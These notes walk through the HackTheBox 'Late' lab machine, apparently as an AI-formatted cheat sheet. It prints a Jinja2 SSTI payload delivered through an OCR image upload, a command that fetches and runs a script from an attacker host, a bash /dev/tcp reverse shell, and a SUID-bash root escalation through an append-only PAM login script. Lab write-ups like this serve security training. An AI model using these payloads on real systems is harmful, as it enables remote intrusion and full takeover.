# 🔎 HTB: Late – Command & Exploit Notes

---

## ⚙️ Recon

### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.156
nmap -p 22,80 -sCV 10.10.11.156
```
- **Open Ports**:
  - `22/tcp`: [SSH](SSH) - OpenSSH 7.6p1 (Ubuntu 18.04)
  - `80/tcp`: [HTTP](HTTP) - nginx 1.14.0

### Hosts File Entry
```bash
echo "10.10.11.156 late.htb images.late.htb" | sudo tee -a /etc/hosts
```

### Fuzzing Subdomains
```bash
wfuzz -u http://10.10.11.156 -H "Host: FUZZ.late.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 9461
```
- Found: `images.late.htb`

### images.late.htb
- Online image OCR interface.
- Upload image ➔ converts to text ➔ returned as `results.txt`
- Mentions **Flask** backend

---

## 🚀 Initial Foothold (svc_acc)

### Vulnerability Discovery
- Image upload returns parsed text in a rendered Flask template.
- Test with image containing:
```
{{ 7*7 }}
```
- Returned: `49` ➔ **SSTI confirmed**

### Payload Trials
- Use [PayloadsAllTheThings Jinja2 RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Injection/README.md#jinja2)
- Payload:
```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
- **Font Troubleshooting**:
  - Use **FreeMono** or similar monospaced font.
  - Goal: Accurate character recognition (underscores, parens, quotes)

### Reverse Shell
```jinja
{{ cycler.__init__.__globals__.os.popen("curl http://10.10.14.6/r | bash").read() }}
```
Create `/r` file on local server:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```
Then:
```bash
python3 -m http.server 80
nc -lnvp 443
```
- Shell returned as `svc_acc`

---

## 🔒 Privilege Escalation to root

### File Enumeration
```bash
ls -l /usr/local/sbin/ssh-alert.sh
lsattr /usr/local/sbin/ssh-alert.sh
```
- `ssh-alert.sh` runs on SSH login (from `/etc/pam.d/sshd`)
- Has **append-only (a)** extended attribute
- Script is **owned by svc_acc** and **appendable**

### Exploit via SSH Login Trigger
Append reverse shell prep to the script:
```bash
echo -e "cp /bin/bash /tmp/.0xdf\nchmod 4755 /tmp/.0xdf" >> /usr/local/sbin/ssh-alert.sh
```
Then re-login via SSH:
```bash
/tmp/.0xdf -p
```
- Root shell acquired.

---

## 🔊 Flags

### User
```bash
cat /home/svc_acc/user.txt
```

### Root
```bash
cat /root/root.txt
```

---

## 🔜 Beyond Root
- Debug web stack:
  - Nginx ➔ Gunicorn ➔ Flask App
- Logins trigger `pam_exec.so` ➔ `ssh-alert.sh` ➔ Email alert
- Overwrite abuse via append-only shell drop

---

Let me know if you want this converted for Obsidian, PDF, or Markdown export ✨

